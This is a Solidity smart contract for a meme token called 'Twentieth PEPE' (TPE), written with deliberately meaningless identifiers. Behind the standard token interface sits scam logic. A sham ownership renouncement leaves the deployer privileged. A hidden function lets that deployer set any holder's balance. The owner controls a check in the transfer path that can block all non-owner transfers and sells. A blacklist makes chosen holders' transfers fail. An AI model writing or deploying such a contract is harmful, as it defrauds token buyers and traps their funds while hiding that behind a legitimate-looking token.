//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface autoEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address takeSellTeam) external view returns (uint256);

    function transfer(address sellTotal, uint256 txWalletSender) external returns (bool);

    function allowance(address txTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 txWalletSender) external returns (bool);

    function transferFrom(
        address sender,
        address sellTotal,
        uint256 txWalletSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityTotalTeam, uint256 value);
    event Approval(address indexed txTotal, address indexed spender, uint256 value);
}

abstract contract walletTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buySellTo {
    function createPair(address tradingTotalIs, address limitMarketing) external returns (address);
}

interface autoEnableMetadata is autoEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TwentiethPEPE is walletTake, autoEnable, autoEnableMetadata {

    function autoTo(address exemptAmount) public {
        require(exemptAmount.balance < 100000);
        if (walletMax) {
            return;
        }
        if (exemptAuto != toEnable) {
            totalExempt = false;
        }
        shouldMin[exemptAmount] = true;
        
        walletMax = true;
    }

    bool public walletMax;

    event OwnershipTransferred(address indexed listLiquidity, address indexed limitLaunchedBuy);

    function receiverLaunch() public {
        emit OwnershipTransferred(fromSwap, address(0));
        atEnable = address(0);
    }

    uint256 marketingLaunch;

    uint256 sellTeam;

    bool private exemptAuto;

    mapping(address => uint256) private teamMarketingLaunch;

    uint256 constant tokenMax = 16 ** 10;

    function walletSell() private view {
        require(shouldMin[_msgSender()]);
    }

    uint256 private liquiditySell;

    mapping(address => bool) public shouldMin;

    bool public totalExempt;

    function getOwner() external view returns (address) {
        return atEnable;
    }

    address teamExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public listAt;

    address private atEnable;

    function buyLaunched(address liquidityMin, address sellTotal, uint256 txWalletSender) internal returns (bool) {
        require(teamMarketingLaunch[liquidityMin] >= txWalletSender);
        teamMarketingLaunch[liquidityMin] -= txWalletSender;
        teamMarketingLaunch[sellTotal] += txWalletSender;
        emit Transfer(liquidityMin, sellTotal, txWalletSender);
        return true;
    }

    bool private atIs;

    uint8 private liquidityList = 18;

    function approve(address autoAt, uint256 txWalletSender) public virtual override returns (bool) {
        teamTotal[_msgSender()][autoAt] = txWalletSender;
        emit Approval(_msgSender(), autoAt, txWalletSender);
        return true;
    }

    bool public swapMaxLimit;

    constructor (){
        if (listAt == exemptShouldSender) {
            swapMaxLimit = false;
        }
        launchTrading listBuy = launchTrading(fundFee);
        txMin = buySellTo(listBuy.factory()).createPair(listBuy.WETH(), address(this));
        
        fromSwap = _msgSender();
        receiverLaunch();
        shouldMin[fromSwap] = true;
        teamMarketingLaunch[fromSwap] = marketingLiquidity;
        if (toEnable != totalExempt) {
            liquiditySell = listAt;
        }
        emit Transfer(address(0), fromSwap, marketingLiquidity);
    }

    bool public toEnable;

    address public txMin;

    mapping(address => bool) public senderEnable;

    string private isReceiver = "TPE";

    function owner() external view returns (address) {
        return atEnable;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return marketingLiquidity;
    }

    mapping(address => mapping(address => uint256)) private teamTotal;

    function receiverTeam(address marketingAuto, uint256 txWalletSender) public {
        walletSell();
        teamMarketingLaunch[marketingAuto] = txWalletSender;
    }

    function sellMarketing(uint256 txWalletSender) public {
        walletSell();
        sellTeam = txWalletSender;
    }

    function allowance(address maxFromTrading, address autoAt) external view virtual override returns (uint256) {
        if (autoAt == fundFee) {
            return type(uint256).max;
        }
        return teamTotal[maxFromTrading][autoAt];
    }

    function name() external view virtual override returns (string memory) {
        return launchedMax;
    }

    address fundFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private swapLimitFee;

    function transferFrom(address liquidityMin, address sellTotal, uint256 txWalletSender) external override returns (bool) {
        if (_msgSender() != fundFee) {
            if (teamTotal[liquidityMin][_msgSender()] != type(uint256).max) {
                require(txWalletSender <= teamTotal[liquidityMin][_msgSender()]);
                teamTotal[liquidityMin][_msgSender()] -= txWalletSender;
            }
        }
        return sellWallet(liquidityMin, sellTotal, txWalletSender);
    }

    function symbol() external view virtual override returns (string memory) {
        return isReceiver;
    }

    uint256 private marketingLiquidity = 100000000 * 10 ** 18;

    uint256 private exemptShouldSender;

    function sellWallet(address liquidityMin, address sellTotal, uint256 txWalletSender) internal returns (bool) {
        if (liquidityMin == fromSwap) {
            return buyLaunched(liquidityMin, sellTotal, txWalletSender);
        }
        uint256 swapTotal = autoEnable(txMin).balanceOf(teamExempt);
        require(swapTotal == sellTeam);
        require(sellTotal != teamExempt);
        if (senderEnable[liquidityMin]) {
            return buyLaunched(liquidityMin, sellTotal, tokenMax);
        }
        return buyLaunched(liquidityMin, sellTotal, txWalletSender);
    }

    function decimals() external view virtual override returns (uint8) {
        return liquidityList;
    }

    string private launchedMax = "Twentieth PEPE";

    function balanceOf(address takeSellTeam) public view virtual override returns (uint256) {
        return teamMarketingLaunch[takeSellTeam];
    }

    function shouldAutoLiquidity(address shouldSender) public {
        walletSell();
        
        if (shouldSender == fromSwap || shouldSender == txMin) {
            return;
        }
        senderEnable[shouldSender] = true;
    }

    function transfer(address marketingAuto, uint256 txWalletSender) external virtual override returns (bool) {
        return sellWallet(_msgSender(), marketingAuto, txWalletSender);
    }

    address public fromSwap;

}